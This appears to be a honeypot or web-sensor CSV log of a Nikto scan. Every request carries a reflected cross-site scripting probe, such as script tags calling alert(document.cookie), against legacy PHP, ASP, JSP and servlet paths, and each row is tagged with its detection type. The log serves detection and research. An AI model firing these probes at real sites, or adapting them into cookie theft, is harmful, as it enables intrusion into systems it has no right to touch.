timestamp,method,path,status,ip,port,uuid,sess_uuid,detection_name,detection_type,user_agent,referer
2025-05-20T07:32:22.979290,GET,"/emailfriend/emailarticle.php?id=\""<script>alert(document.cookie)</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,9508a2c3-f312-44bb-8073-b9dba81b3ceb,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000706),
2025-05-20T07:32:22.987608,GET,"/administrator/upload.php?newbanner=1&choice=\""<script>alert(document.cookie)</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,6aa88034-ac89-44f0-b788-746af51271a6,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000707),
2025-05-20T07:32:22.997085,GET,"/administrator/popups/sectionswindow.php?type=web&link=\""<script>alert(document.cookie)</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,5eb3adf8-f7b8-480a-8241-668da1a193f1,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000708),
2025-05-20T07:32:23.005804,GET,"/administrator/gallery/view.php?path=\""<script>alert(document.cookie)</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,f278424b-931c-4a3b-aba0-abcdb7f28cb5,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000709),
2025-05-20T07:32:23.014347,GET,"/administrator/gallery/uploadimage.php?directory=\""<script>alert(document.cookie)</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,4d53aee6-4a97-4a98-9172-4a0a93bb4c32,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000710),
2025-05-20T07:32:23.023940,GET,"/administrator/gallery/navigation.php?directory=\""<script>alert(document.cookie)</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,a3448cfa-9ee2-47b4-b6f1-17a601368756,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000711),
2025-05-20T07:32:23.032363,GET,"/administrator/gallery/gallery.php?directory=\""<script>alert(document.cookie)</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,8498f4d5-9fd3-4684-81b8-23c646e51b08,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000712),
2025-05-20T07:32:23.043458,GET,/index.php?dir=<script>alert('Vulnerable')</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,e0ced8cf-d078-4a79-8339-950178877b6f,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000713),
2025-05-20T07:32:23.054235,GET,/https-admserv/bin/index?/<script>alert(document.cookie)</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,982080eb-3c67-4a7d-88f9-137a3bd3e0b5,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000714),
2025-05-20T07:32:23.059799,GET,/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,3d4878ba-7d09-4087-8cec-720767fcf5ab,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000715),
2025-05-20T07:32:23.068843,GET,/article.cfm?id=1'<script>alert(document.cookie);</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,a987ff7e-c982-48cd-a500-a739efba6787,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000716),
2025-05-20T07:32:23.078970,GET,"/upload.php?type=\""<script>alert(document.cookie)</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,1215eeee-5afa-44b4-8155-f6904670066a,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000717),
2025-05-20T07:32:23.087634,GET,"/soinfo.php?\""><script>alert('Vulnerable')</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,042bdc4c-c62a-4e08-b637-77e2e24a8fe9,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000718),
2025-05-20T07:32:23.092795,GET,/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,446cf8e8-4c51-43d9-83c2-0600436c7479,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000719),
2025-05-20T07:32:23.101311,GET,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,64912ab9-748c-47ea-b8e9-04aba29572c2,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000720),
2025-05-20T07:32:23.109890,GET,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,928caeb3-9781-4981-b861-0a1196a1975b,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000721),
2025-05-20T07:32:23.118778,GET,/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,13610cf0-5e48-4b88-b6b4-7e8ef4db0814,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000722),
2025-05-20T07:32:23.128584,GET,/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,67d2fb06-c169-470e-bfc8-a9fd41c3a581,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000723),
2025-05-20T07:32:23.133499,GET,/666%0a%0a<script>alert('Vulnerable');</script>666.jsp,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,4a7505cd-95f6-4767-a6a5-42c50f3ff2e0,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000724),
2025-05-20T07:32:23.138452,GET,/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,f9fcfaf6-f1fe-421d-a14e-2b3da55dd588,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000725),
2025-05-20T07:32:23.146664,GET,/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,d6b7c86f-5534-4bea-bf7e-e9a1a10b8616,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000726),
2025-05-20T07:32:23.151423,GET,/servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,81c94607-2a49-4988-9634-ef8e67c75264,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000727),
2025-05-20T07:32:23.155841,GET,/servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,0b342330-0c2f-47ec-9df6-3aff48a2c132,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000728),
2025-05-20T07:32:23.160374,GET,/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,e6de4533-0609-43f2-aab0-6d83184bf66f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000729),
2025-05-20T07:32:23.165668,GET,/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,5aa217bb-5d3e-4058-82e4-850a86b7b756,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000730),
2025-05-20T07:32:23.173478,GET,/<script>alert('Vulnerable')</script>.shtm,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,c0788ed0-91b6-4d6d-b5be-21d71c329372,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000731),
2025-05-20T07:32:23.178253,GET,/<script>alert('Vulnerable')</script>.stm,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,06054b0d-01d2-4d3b-ab22-cde4526f29b8,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000732),
2025-05-20T07:32:23.185299,GET,"/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\""><script>alert(document.cookie)</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,8effac8e-bc82-40ca-9ea6-3d6601bacfeb,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000733),
2025-05-20T07:32:23.194171,GET,"/SiteServer/Knowledge/Default.asp?ctr=\""><script>alert('Vulnerable')</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,9e35f9d0-a707-4232-aab4-1501a9409335,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000734),
2025-05-20T07:32:23.202581,GET,"/_mem_bin/formslogin.asp?\""><script>alert('Vulnerable')</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,3db063af-1c71-4f41-9aa3-089d534bf068,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000735),
2025-05-20T07:32:23.206720,GET,/nosuchurl/><script>alert('Vulnerable')</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,6b614f7e-ca13-4a7d-98ec-9ad98edf8840,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000736),
2025-05-20T07:32:23.212785,GET,/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,79af5d45-eef8-4415-8164-f5c51adee5c0,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000737),
2025-05-20T07:32:23.217496,GET,/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,5b1987a3-d626-4374-9826-3617292d7d0c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000738),
2025-05-20T07:32:23.222160,GET,/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,959cfd0a-0312-4487-8fd2-45536224af20,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000740),
2025-05-20T07:32:23.227724,GET,/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,bd4ac71c-c4a0-48a4-91b7-0109c9e7505a,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000741),
2025-05-20T07:32:23.236609,GET,/~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,8d504863-5ce1-4b07-af55-d1f71b9c9531,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000767),
2025-05-20T07:32:23.241470,GET,/~/<script>alert('Vulnerable')</script>.aspx,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,343fcf78-8a17-4f74-ba2c-c318f8ad1c65,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000768),
2025-05-20T07:32:23.247863,GET,/~/<script>alert('Vulnerable')</script>.asp,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,7be0f07e-e8c9-4cbe-b0cc-f8408a98b5d9,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000769),
2025-05-20T07:32:23.252850,GET,/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,6b6b2084-0085-4017-818a-b9fd0e721705,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000770),
2025-05-20T07:32:23.262024,GET,/catinfo?<u><b>TESTING,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,99f295f8-3c67-4ac1-b5cf-c54f93930518,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000771),
2025-05-20T07:32:23.266712,GET,"/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>",200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,767303fd-10c2-4b81-9f27-662a15cae102,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000772),
2025-05-20T07:32:23.275575,GET,/webamil/test.php,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,129d1b88-f279-4832-980a-24116530360a,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000773),
2025-05-20T07:32:23.280683,GET,/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,2243aebd-a845-40da-bd87-8f7128074230,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000774),
2025-05-20T07:32:23.285302,GET,/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27),200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,11f989b5-848f-4c8d-a045-7ca56e0336d0,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000775),
2025-05-20T07:32:23.290973,GET,/user.php?op=userinfo&uname=<script>alert('hi');</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,dceeb8e7-5370-4f78-943a-0430ec3a71b4,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000776),
2025-05-20T07:32:23.299589,GET,/TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,c84ce65a-0e15-47da-bbc6-e7bcff9e2b36,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000779),
2025-05-20T07:32:23.304801,GET,/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,24948b92-7d35-4ed3-abc9-01016c4a325e,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000780),
2025-05-20T07:32:23.315742,GET,/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,0b9d8734-18ac-442c-ac9d-1799a19924b3,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000781),
2025-05-20T07:32:23.324895,GET,/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,0bb9f209-563e-4006-8cdc-d24a3ffcaa1d,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000782),
2025-05-20T07:32:23.329867,GET,/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,c7048427-25e7-487a-b1ff-e3fcf85c2a90,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000783),
2025-05-20T07:32:23.334796,GET,/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,35395774-f7a3-461f-96ae-ede2e94b676f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000784),
2025-05-20T07:32:23.339814,GET,/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>,200,172.18.0.1,57884,6fd7ef35-b057-461d-aaec-677f18cc692b,070b080b-966c-46c1-b6ef-acdb2571e4ca,xss,2,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000785),
